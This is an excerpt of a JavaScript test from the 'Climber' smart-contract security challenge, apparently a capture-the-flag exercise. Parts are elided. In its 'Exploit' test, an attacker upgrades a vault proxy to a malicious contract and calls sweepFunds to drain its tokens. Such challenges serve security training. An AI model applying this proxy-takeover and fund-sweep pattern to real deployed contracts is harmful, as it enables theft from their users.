...
describe('[Challenge] Climber', function () {
    ...
    it('Exploit', async function () {        
        ...
        this.upgradedVaultContract = await ethers.getContractFactory('UpgradedVault', attacker);
        ...
        const compromisedVault = await upgrades.upgradeProxy(
            this.vault.address,
            this.upgradedVaultContract
        );

        compromisedVault.connect(attacker).sweepFunds(this.token.address);
    });
